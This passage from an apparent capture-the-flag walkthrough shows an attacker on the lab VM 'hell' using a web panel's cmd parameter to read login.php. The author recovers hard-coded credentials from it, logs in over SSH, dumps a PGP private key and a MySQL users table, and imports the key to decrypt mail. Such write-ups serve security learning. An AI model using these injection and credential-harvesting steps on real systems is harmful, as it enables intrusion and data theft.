</span><span class='line'>drwxr-xr-x 2 www-data www-data  4096 Jul 13 05:32 super_secret_login_path_muhahaha
</span><span class='line'><span class="nt">&lt;/HTML&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Here I found some sensitive information in <code>login.php</code> file.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>root@kali:~/hell# curl <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://10.10.10.146/super_secret_login_path_muhahaha/panel.php?cmd=cat+login.php&quot;</span><span class="nt">&gt;</span>http://10.10.10.146/super_secret_login_path_muhahaha/panel.php?cmd=cat+login.php<span class="nt">&lt;/a&gt;</span> -c cookies -b cookies<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;&lt;HTML&gt;</span>
</span><span class='line'><span class="nt">&lt;CENTRE&gt;</span>
</span><span class='line'><span class="nt">&lt;H2&gt;</span> Folders <span class="nt">&lt;/H2&gt;</span>
</span><span class='line'><span class="nt">&lt;TABLE</span> <span class="na">style=</span><span class="s">&quot;width:700px&quot;</span> <span class="na">align=</span><span class="s">&quot;center&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;server.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;mail.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;users.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;personal.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;notes.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Server Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Mail Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Auth Users<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Personal Folder<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Notes<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;/CENTRE&gt;</span>
</span><span class='line'><span class="ni">&amp;lt;</span>?PHP
</span><span class='line'>session_start();<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>function login(){<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;pre&gt;&lt;code&gt;</span>$username = mysql_escape_string($_POST[&quot;username&quot;]);
</span><span class='line'>$password = mysql_escape_string($_POST[&quot;password&quot;]);
</span><span class='line'>// mysql_connect(&quot;127.0.0.1&quot;, &quot;Jack&quot;, &quot;zgcR6mU6pX&quot;) or die (&quot;Server Error&quot;); I&#39;ll change this back once development is done. Got sick of typing my password.
</span><span class='line'>mysql_connect(&quot;127.0.0.1&quot;, &quot;www-data&quot;, &quot;website&quot;) or die(&quot;Server Error&quot;);
</span><span class='line'>mysql_select_db(&quot;website&quot;) or die(&quot;Server Error&quot;);
</span><span class='line'>$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;
</span><span class='line'>$res = mysql_query($sql) or die(&quot;Server Error&quot;);
</span><span class='line'>$row = mysql_fetch_row($res);
</span><span class='line'>if ($row[0]) {
</span><span class='line'>    return 1;
</span><span class='line'>} else {
</span><span class='line'>    return 0;
</span><span class='line'>}
</span><span class='line'><span class="nt">&lt;/code&gt;&lt;/pre&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>}<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>if (login()) {
</span><span class='line'>    $_SESSION[<span class="ni">&amp;ldquo;</span>valid<span class="ni">&amp;rdquo;</span>] = 1;
</span><span class='line'>    setcookie(time()+600);
</span><span class='line'>    header(<span class="ni">&amp;lsquo;</span>Location: index.php<span class="ni">&amp;rsquo;</span>);
</span><span class='line'>} else {
</span><span class='line'>    header(<span class="ni">&amp;lsquo;</span>Location: index.php?the_user_is_a_failure=1<span class="ni">&amp;rsquo;</span>);
</span><span class='line'>}
</span><span class='line'>?&gt;
</span><span class='line'><span class="nt">&lt;/HTML&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>From the comment, I got credential: <em><font color="red">jack</font> / <font color="red">zgcR6mU6pX</font></em>
I also got mysql&rsquo;s login credential is <em><font color="red">www-data</font> / <font color="red">website</font></em></p>

<p>Trying SSH login as jack with discovered password and it works! Now I am jack.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>root@kali:~# ssh <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;&amp;#x6d;&amp;#x61;&amp;#105;&amp;#108;&amp;#116;&amp;#111;&amp;#58;&amp;#x6a;&amp;#97;&amp;#99;&amp;#107;&amp;#x40;&amp;#49;&amp;#48;&amp;#46;&amp;#x31;&amp;#48;&amp;#46;&amp;#x31;&amp;#48;&amp;#46;&amp;#49;&amp;#x34;&amp;#x36;&quot;</span><span class="nt">&gt;</span><span class="ni">&amp;#x6a;&amp;#x61;&amp;#x63;&amp;#107;&amp;#64;&amp;#49;&amp;#48;&amp;#46;&amp;#x31;&amp;#48;&amp;#46;&amp;#x31;&amp;#x30;&amp;#x2e;&amp;#49;&amp;#x34;&amp;#x36;</span><span class="nt">&lt;/a&gt;</span>
</span><span class='line'><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;&amp;#x6d;&amp;#x61;&amp;#x69;&amp;#x6c;&amp;#x74;&amp;#111;&amp;#x3a;&amp;#106;&amp;#x61;&amp;#x63;&amp;#107;&amp;#x40;&amp;#49;&amp;#x30;&amp;#46;&amp;#49;&amp;#48;&amp;#46;&amp;#49;&amp;#x30;&amp;#46;&amp;#49;&amp;#52;&amp;#x36;&quot;</span><span class="nt">&gt;</span><span class="ni">&amp;#x6a;&amp;#97;&amp;#99;&amp;#107;&amp;#64;&amp;#x31;&amp;#x30;&amp;#x2e;&amp;#49;&amp;#48;&amp;#46;&amp;#49;&amp;#48;&amp;#x2e;&amp;#49;&amp;#x34;&amp;#54;</span><span class="nt">&lt;/a&gt;</span><span class="ni">&amp;rsquo;</span>s password:
</span><span class='line'>Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>The programs included with the Debian GNU/Linux system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>No mail.
</span><span class='line'>Last login: Sun Jul 12 05:12:42 2015 from 10.10.10.131
</span><span class='line'>$ id
</span><span class='line'>uid=1001(jack) gid=1001(jack) groups=1001(jack)
</span><span class='line'>$ pwd
</span><span class='line'>/home/jack
</span><span class='line'>$ ls -l
</span><span class='line'>total 4
</span><span class='line'>drwx<span class="ni">&amp;mdash;&amp;mdash;</span> 2 jack jack 4096 Jun 18  2014 g0tmi1k_pics
</span><span class='line'>$ ls -l g0tmi1k_pics
</span><span class='line'>total 284
</span><span class='line'>-rwx<span class="ni">&amp;mdash;&amp;mdash;</span> 1 jack jack 180289 Dec  1  2010 1.jpg
</span><span class='line'>-rwx<span class="ni">&amp;mdash;&amp;mdash;</span> 1 jack jack  29494 Sep 12  2013 2.jpg
</span><span class='line'>-rwx<span class="ni">&amp;mdash;&amp;mdash;</span> 1 jack jack  72070 Jun 18  2014 3.jpg
</span><span class='line'>$ ls -lah
</span><span class='line'>total 32K
</span><span class='line'>drwx<span class="ni">&amp;mdash;&amp;mdash;</span> 5 jack jack 4.0K Jul 12 05:28 .
</span><span class='line'>drwxr-xr-x 7 root root 4.0K Jul  5  2014 ..
</span><span class='line'>-rwx<span class="ni">&amp;mdash;&amp;mdash;</span> 1 jack jack    1 Jun 22  2014 .bash_logout
</span><span class='line'>-rwx<span class="ni">&amp;mdash;&amp;mdash;</span> 1 jack jack 3.4K Jun 18  2014 .bashrc
</span><span class='line'>drwx<span class="ni">&amp;mdash;&amp;mdash;</span> 2 jack jack 4.0K Jun 18  2014 g0tmi1k_pics
</span><span class='line'>drwx<span class="ni">&amp;mdash;&amp;mdash;</span> 2 jack jack 4.0K Jul 12 05:30 .gnupg
</span><span class='line'>drwx<span class="ni">&amp;mdash;&amp;mdash;</span> 2 jack jack 4.0K Jun 18  2014 .pgp
</span><span class='line'>-rwx<span class="ni">&amp;mdash;&amp;mdash;</span> 1 jack jack  675 Jan  1  2013 .profile
</span><span class='line'>$ cd .pgp
</span><span class='line'>$ ls -lah
</span><span class='line'>total 20K
</span><span class='line'>drwx<span class="ni">&amp;mdash;&amp;mdash;</span> 2 jack jack 4.0K Jun 18  2014 .
</span><span class='line'>drwx<span class="ni">&amp;mdash;&amp;mdash;</span> 5 jack jack 4.0K Jul 12 05:28 ..
</span><span class='line'>-rwx<span class="ni">&amp;mdash;&amp;mdash;</span> 1 jack jack   39 Jun 18  2014 note
</span><span class='line'>-rwx<span class="ni">&amp;mdash;&amp;mdash;</span> 1 jack jack 1.8K Jun 18  2014 pgp.priv
</span><span class='line'>-rwx<span class="ni">&amp;mdash;&amp;mdash;</span> 1 jack jack  890 Jun 18  2014 pgp.pub
</span><span class='line'>$ cat note
</span><span class='line'>The usual password as with everything.
</span><span class='line'>$ cat pgp.priv
</span><span class='line'><span class="ni">&amp;mdash;&amp;ndash;</span>BEGIN PGP PRIVATE KEY BLOCK<span class="ni">&amp;mdash;&amp;ndash;</span>
</span><span class='line'>Version: BCPG C# v1.6.1.0<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>lQOsBFOg9v8BCACbr++BXlL9e4N6pzcrHkNZGANB7Ii3vHc0Nj37kCm7ZuTMx4LN
</span><span class='line'>bpWrqGb9W9grS9YQ7xSEkBShaKlWMilb4rqrM/tmDyuGt9UozCrVrCTfaZdPl72o
</span><span class='line'>u1QO1DxTT9/iFwlb6AAjTvJGQQx92PQeShEOeTtycH+Xz4tx1ezHpbA4HK9ijftR
</span><span class='line'>lyZy+y9GPSqYLsIU3N8WtnrTJRfSMiU/AGv/GWpykp3tlHjIL0YSHfvUppe4xAil
</span><span class='line'>54J+LN7se3jKuFcRM+i9TF08hsTtM6azl7X4yyEDhHcvWgFY/vyggEwe6/ZP1IKG
</span><span class='line'>zzAWi0sx7tlZLxyr9AFSXLwLvbhUpR3M5rJBABEBAAH/AwMC8ht700SVD+1guMSO
</span><span class='line'>NKMnwLvKkrmW32b/zo/x4g4MbhUs1BXIvHfGw1ArsEpkMucb8utDqGzcwctR00de
</span><span class='line'>jTr/nFo0gKxBMgc34e9HNTI0iFlVYWDFZqU4ie6/Pyt8qvZHOe5Aq0qPsCkcdMME
</span><span class='line'>bR6EQng1ZBXX7zHCF2TobPnIxp5CGI2WUwXmXaGQS/hRriIcAhDx5ZFFqOdVQWES
</span><span class='line'>mLo5Rd205/M4mungbUvwrHayu6ZGume+VXs630YaacNiBFpXnPDfKOCipZ+EhYsz
</span><span class='line'>7febMxXj3mANwLXQfyTZOIXPzMptE11fbDA8jpy9m0vMy5ZCpJnp/VoTaaUxMz45
</span><span class='line'>OeUI9nKTx9P1lGPC9hYidshg3Sg5Iz/qqmL/byAv1bUV2YOdJlAS1XY9Jj/wNrYz
</span><span class='line'>yG9ASw5nfp0ChhLYnnU4dgfEk5bajGvgnhZAlb/+yNvJ5eUcwivjFC8jJUwlrZ+Z
</span><span class='line'>oj1XAC4148JsjcQHW1d7yONc4iI7tSubMNa5GfBal1BxMRLP3nSZ4ICl67gTjrKH
</span><span class='line'>ztiMKAefip3ywnRomfn7q9raJQ8TsKp0+REVy05mhZMZ1AdMlZzhTz8cYy8II6yr
</span><span class='line'>qSxuJARfJ95FGYPrASMfJ+aZfPNk5RDnH5d92vxm/nIWexdayZqqQJG4MzOhtrjx
</span><span class='line'>a0YouqQhxvD2aKslEBJ1S/D4D40xkVI+oaI+aM/6X+XzC2XVJgm7G8FvmtE09BUm
</span><span class='line'>fAMUxE/bgsv33QXsURtelfuoZRLz/OmwybXpwv+Zen0n8hpjQEAOhqD4eieIxH9j
</span><span class='line'>7W6ijInh9XD8jcnUa4eHw7WDa0LPtyQSbPZB1hZou6z8pAZY0LxhmstpPjSYfdKR
</span><span class='line'>HRjhRuu0tdZ2PrKx1wKooo/iiJdZ0Cgizlu4k76rDrQSamFja0Bjb3dsb3ZlcnMu
</span><span class='line'>Y29tiQEcBBABAgAGBQJToPb/AAoJEL26wSU/GKsKnk0H/iWvOGuWwge8VteqxPip
</span><span class='line'>yu2LwvLzjbHAeWwBmsg69h+Yl5l8Y+3B9aoCpnjM2QmMAFHxVA8L6Z4UIyhNJ90Y
</span><span class='line'>l18rYZec9cDUrflowd/A4QVrJNCV/5kCyPeQ03mzGHnlTTvb/qBMymmpVBeP3JoK
</span><span class='line'>vZkGYzFBmrt7q19b3VcvexLTwtLtch8NUOt6719UFRvxE+EXu4JbItr7dSqfYDbh
</span><span class='line'>zHsfGaeU1hCQJg/n83IRxTBsc7h1jIOxraovzbErqpZ6YeYhCK5oo38dJVpz9Daa
</span><span class='line'>quU6lGTizKWX3HS29HQl+PJvzoHyj3T6Aw71BZF4lZNrJmzxHqhVYuRWptioyTWo
</span><span class='line'>tqg=
</span><span class='line'>=SCkw
</span><span class='line'><span class="ni">&amp;mdash;&amp;ndash;</span>END PGP PRIVATE KEY BLOCK<span class="ni">&amp;mdash;&amp;ndash;</span>
</span><span class='line'>$
</span></code></pre></td></tr></table></div></figure></p>

<p>After poking around, I found <code>.pgp</code> hidden folder which include PGP private key and public key in jack&rsquo;s home directory, take a note and will be used later.</p>

<h2>Moving to <em>milk_4_life</em></h2>

<p>Then I was trying to login to MYSQL database and found jack&rsquo;s web admin password is <em><font color="red">g0tmi1k69</font></em></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>$ mysql -uwww-data -p
</span><span class='line'>Enter password:
</span><span class='line'>Welcome to the MySQL monitor.  Commands end with ; or \g.
</span><span class='line'>Your MySQL connection id is 37
</span><span class='line'>Server version: 5.5.37-0+wheezy1 (Debian)<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>Copyright <span class="ni">&amp;copy;</span> 2000, 2014, Oracle and/or its affiliates. All rights reserved.<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>Oracle is a registered trademark of Oracle Corporation and/or its
</span><span class='line'>affiliates. Other names may be trademarks of their respective
</span><span class='line'>owners.<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>Type <span class="ni">&amp;lsquo;</span>help;<span class="ni">&amp;rsquo;</span> or <span class="ni">&amp;lsquo;</span>\h<span class="ni">&amp;rsquo;</span> for help. Type <span class="ni">&amp;lsquo;</span>\c<span class="ni">&amp;rsquo;</span> to clear the current input statement.<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>mysql&gt; show databases;
</span><span class='line'>+<span class="ni">&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash;</span>+
</span><span class='line'>| Database           |
</span><span class='line'>+<span class="ni">&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash;</span>+
</span><span class='line'>| information_schema |
</span><span class='line'>| website            |
</span><span class='line'>+<span class="ni">&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash;</span>+
</span><span class='line'>2 rows in set (0.01 sec)<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>mysql&gt; use website
</span><span class='line'>Reading table information for completion of table and column names
</span><span class='line'>You can turn off this feature to get a quicker startup with -A<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>Database changed
</span><span class='line'>mysql&gt; show tables;
</span><span class='line'>+<span class="ni">&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;</span>-+
</span><span class='line'>| Tables_in_website |
</span><span class='line'>+<span class="ni">&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;</span>-+
</span><span class='line'>| users             |
</span><span class='line'>+<span class="ni">&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;</span>-+
</span><span class='line'>1 row in set (0.00 sec)<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>mysql&gt; select * from users;
</span><span class='line'>+<span class="ni">&amp;mdash;&amp;mdash;&amp;mdash;</span>-+<span class="ni">&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash;</span>+
</span><span class='line'>| username | password  |
</span><span class='line'>+<span class="ni">&amp;mdash;&amp;mdash;&amp;mdash;</span>-+<span class="ni">&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash;</span>+
</span><span class='line'>| Jack     | g0tmi1k69 |
</span><span class='line'>+<span class="ni">&amp;mdash;&amp;mdash;&amp;mdash;</span>-+<span class="ni">&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash;</span>+
</span><span class='line'>1 row in set (0.00 sec)<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>mysql&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>Then I found there is an email for jack but it is encrypted by PGP, so I need using pgp private key (which is found before) to decrypt the message. Here is a handy <code>gpg</code> help <a href="http://irtfweb.ifa.hawaii.edu/~lockhart/gpg/gpg-cs.html">guide</a>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ls -alh /var/mail
</span><span class='line'>total 16K
</span><span class='line'>drwxrwsr-x  4 root   mail   4.0K Jul 15 09:25 .
</span><span class='line'>drwxr-xr-x 12 root   root   4.0K Jun 17  2014 ..
</span><span class='line'>drwxr-sr-x  2 george george 4.0K Jun 20  2014 george
</span><span class='line'>drwxr-sr-x  3 jack   jack   4.0K Jul  5  2014 jack
</span><span class='line'>$ ls -alh /var/mail/jack
</span><span class='line'>total 12K
</span><span class='line'>drwxr-sr-x 3 jack jack 4.0K Jul  5  2014 .
</span><span class='line'>drwxrwsr-x 4 root mail 4.0K Jul 15 09:25 ..
</span><span class='line'>drwxr-sr-x 2 root mail 4.0K Jun 18  2014 received
</span><span class='line'>$ ls -alh /var/mail/jack/received
</span><span class='line'>total 12K
</span><span class='line'>drwxr-sr-x 2 root mail 4.0K Jun 18  2014 .
</span><span class='line'>drwxr-sr-x 3 jack jack 4.0K Jul  5  2014 ..
</span><span class='line'>-rw-r&ndash;r&ndash; 1 root mail  709 Jun 18  2014 message.eml
</span><span class='line'>$ cat /var/mail/jack/received/message.eml
</span><span class='line'>&mdash;&ndash;BEGIN PGP MESSAGE&mdash;&ndash;
</span><span class='line'>Version: BCPG C# v1.6.1.0&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>hQEMA726wSU/GKsKAQf/ZnGxyaHQ6wMhSzpbn2J2uVKoPFS3tHdnBzJ18kswBwOm
</span><span class='line'>yff3Joe5RTtMgdjydD+37DSg6SikjcdzJiHV3y5QHqxVcNt5xo0BdYNCWoqjdMzJ
</span><span class='line'>3g50VEwMg5DZwLvTmUr4f+CJ7bc/Cv2hHazKXnT7s71lqBLSCCsNwZuWpxYW1OMX
</span><span class='line'>7CNE92QXayltmQ0GLajIMtzmGlszgwQkVjQ2h9wMGelVYHi5hYsEZzIdh6/9Jo24
</span><span class='line'>rerlq1CY6/T70KsY6GyBoU3iKFgsIkwcb6whrlR/6SCK2vNmLlz2AfDSITYY+6vZ
</span><span class='line'>MWXhiYbZSRyHq7gaYRKS6kzG6uLlsyq4YnQzhz8M+sm4dePDBvs7U6yAPJf4oAAH
</span><span class='line'>9o01Fp3IJ1isvVMH5Fr8MwQjOAuo6Yh6TwbOrI/MVpphJQja8gDKVYr2tlqNS5me
</span><span class='line'>V8xJ7ZUxsh67w/5s5s1JgEDQt+f4wckBc8Dx5k9SbS9iRUbZ0oLJ3IM8cUj3CDoo
</span><span class='line'>svsh0u4ZWj4SrLsEdErcNX6gGihRl/xs3qdVOpXtesSvxEQcWHLqtMY94tb29faD
</span><span class='line'>+oQPjG3V4cSY5r566esUAlCn7ooYyx6Dug==
</span><span class='line'>=svWU
</span><span class='line'>&mdash;&ndash;END PGP MESSAGE&mdash;&ndash;
</span><span class='line'>$ gpg &ndash;allow-secret-key-import &ndash;import .pgp/pgp.priv
</span><span class='line'>gpg: key 3F18AB0A: secret key imported
